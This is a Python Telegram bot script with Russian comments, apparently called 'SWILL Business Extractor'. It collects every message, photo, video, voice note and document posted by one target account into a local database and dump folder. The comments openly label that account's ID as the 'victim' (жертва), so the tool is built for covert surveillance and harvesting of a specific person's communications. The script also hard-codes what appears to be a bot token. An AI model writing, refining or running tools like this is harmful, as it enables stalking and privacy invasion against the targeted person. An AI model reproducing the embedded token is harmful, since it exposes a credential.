#!/usr/bin/env python3
# SWILL Business Extractor - ИСПРАВЛЕННАЯ ВЕРСИЯ

import asyncio
import signal
import sys
import os
import sqlite3
import time
from datetime import datetime
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.exceptions import TelegramConflictError

# ======================================================
# КОНФИГ - ОБНОВИ ТОКЕН!
# ======================================================
# ⚠️ СБРОСЬ ТОКЕН ЧЕРЕЗ @BotFather И ВСТАВЬ НОВЫЙ!
BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # НЕ СТАРЫЙ!

TARGET_ACCOUNT_ID = 6939132428  # ID жертвы

# Настройки
SAVE_MEDIA = True
SAVE_DELETED = True
# ======================================================

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Папка для дампа
BASE_PATH = Path.cwd() / f'dump_{TARGET_ACCOUNT_ID}_{int(time.time())}'
os.makedirs(BASE_PATH, exist_ok=True)

# Создаём папки для медиа
MEDIA_PATH = BASE_PATH / 'media'
PHOTOS_PATH = MEDIA_PATH / 'photos'
VIDEOS_PATH = MEDIA_PATH / 'videos'
AUDIO_PATH = MEDIA_PATH / 'audio'
DOCS_PATH = MEDIA_PATH / 'documents'

for p in [MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, DOCS_PATH]:
    os.makedirs(p, exist_ok=True)

# SQLite
conn = sqlite3.connect(BASE_PATH / 'data.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        chat_title TEXT,
        date TEXT,
        from_id TEXT,
        from_name TEXT,
        text TEXT,
        media_type TEXT,
        media_path TEXT,
        is_deleted BOOLEAN DEFAULT 0,
        target_account_id INTEGER
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS progress (
        chat_id INTEGER PRIMARY KEY,
        last_message_id INTEGER
    )
''')

conn.commit()

stats = {'total': 0, 'media': 0, 'errors': 0}

async def log(text):
    """Логирование"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
        f.write(f'[{timestamp}] {text}\n')
    print(f'[{timestamp}] {text}')

async def download_media(msg: types.Message):
    """Скачивание медиа"""
    if not SAVE_MEDIA:
        return None, None
    
    try:
        media_type = None
        ext = '.bin'
        folder = MEDIA_PATH
        
        if msg.photo:
            media_type = 'photo'
            ext = '.jpg'
            folder = PHOTOS_PATH
            file = msg.photo[-1]
        elif msg.video:
            media_type = 'video'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video
        elif msg.audio:
            media_type = 'audio'
            ext = '.mp3'
            folder = AUDIO_PATH
            file = msg.audio
        elif msg.voice:
            media_type = 'voice'
            ext = '.ogg'
            folder = AUDIO_PATH
            file = msg.voice
        elif msg.document:
            media_type = 'document'
            ext = '.dat'
            folder = DOCS_PATH
            file = msg.document
        elif msg.video_note:
            media_type = 'video_note'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video_note
        elif msg.sticker:
            media_type = 'sticker'
            ext = '.webp'
            folder = MEDIA_PATH
            file = msg.sticker
        else:
            return None, None
        
        filename = f'{msg.message_id}_{int(time.time())}{ext}'
        filepath = folder / filename
        
        await bot.download(file, destination=str(filepath))
        stats['media'] += 1
        await log(f'📁 Скачано медиа: {filename}')
        return str(filepath), media_type
        
    except Exception as e:
        stats['errors'] += 1
        await log(f'❌ Ошибка скачивания: {e}')
        return None, None

@dp.message()
async def handle_message(msg: types.Message):
    """Обработка сообщений"""
    # Проверяем, что сообщение от целевого аккаунта
    if msg.from_user and msg.from_user.id == TARGET_ACCOUNT_ID:
        try:
            chat_title = msg.chat.title or msg.chat.full_name or str(msg.chat.id)
            
            # Скачиваем медиа
            media_path, media_type = await download_media(msg)
            
            # Сохраняем в БД
            cursor.execute('''
                INSERT OR REPLACE INTO messages 
                (id, chat_id, chat_title, date, from_id, from_name, text, media_type, media_path, target_account_id)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                msg.message_id,
                msg.chat.id,
                chat_title,
                str(msg.date),
                str(msg.from_user.id),
                msg.from_user.full_name or 'unknown',
                msg.text or msg.caption or '',
                media_type,
                media_path,
                TARGET_ACCOUNT_ID
            ))
            conn.commit()
            stats['total'] += 1
            await log(f'✅ Сообщение {msg.message_id} сохранено')
            
        except Exception as e:
            stats['errors'] += 1
            await log(f'❌ Ошибка сохранения: {e}')

@dp.my_chat_member()
async def on_bot_added(event: types.ChatMemberUpdated):
    """Когда бота добавляют в чат"""
    me = await bot.get_me()
    if event.new_chat_member.user.id == me.id:
        await log(f'➕ Бот добавлен в чат: {event.chat.id} ({event.chat.title or "личный"})')
        
        # Проверяем, не обрабатывали ли этот чат
        cursor.execute('SELECT COUNT(*) FROM messages WHERE chat_id = ?', (event.chat.id,))
        if cursor.fetchone()[0] == 0:
            await log(f'📊 Начинаем сбор истории чата {event.chat.id}...')

async def shutdown(sig, bot):
    """Корректное завершение"""
    await log('🛑 Получен сигнал завершения, сохраняю данные...')
    conn.commit()
    await log(f'📊 Всего сохранено: {stats["total"]} сообщений, {stats["media"]} медиа')
    await bot.session.close()
    await log('👋 Бот остановлен')
    sys.exit(0)

async def main():
    """Главная функция"""
    # Настройка обработки сигналов
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(
            sig,
            lambda s=sig: asyncio.create_task(shutdown(s, bot))
        )
    
    await log('='*60)
    await log('🚀 SWILL БОТ ЗАПУЩЕН')
    await log(f'🎯 Целевой ID: {TARGET_ACCOUNT_ID}')
    await log(f'📁 Папка: {BASE_PATH}')
    
    print(f'\n{"="*60}')
    print(f'🚀 SWILL БОТ ЗАПУЩЕН')
    print(f'🎯 Цель: {TARGET_ACCOUNT_ID}')
    print(f'📁 Папка: {BASE_PATH}')
    print(f'{"="*60}\n')
    
    # Проверяем бота
    try:
        me = await bot.get_me()
        await log(f'🤖 Бот: @{me.username} (ID: {me.id})')
        print(f'🤖 Бот: @{me.username} (ID: {me.id})')
    except Exception as e:
        await log(f'❌ Ошибка проверки бота: {e}')
        print(f'❌ Ошибка: {e}')
        return
    
    # Удаляем вебхук
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await log('✅ Вебхук удалён')
        print('✅ Вебхук удалён')
    except Exception as e:
        await log(f'⚠️ Ошибка удаления вебхука: {e}')
    
    # Запускаем polling
    try:
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=['message', 'my_chat_member']
        )
    except TelegramConflictError as e:
        await log(f'❌ КОНФЛИКТ: {e}')
        print(f'\n❌ КОНФЛИКТ!')
        print(f'Бот ID: {me.id}')
        print(f'Решение:')
        print('1. Сбрось токен через @BotFather')
        print('2. Используй НОВЫЙ токен')
        print('3. Перезапусти бота\n')
        await bot.session.close()
        sys.exit(1)
    except Exception as e:
        await log(f'❌ Ошибка: {e}')
        await bot.session.close()
        sys.exit(1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('\n👋 Остановка пользователем')
    except Exception as e:
        print(f'❌ Критическая ошибка: {e}')
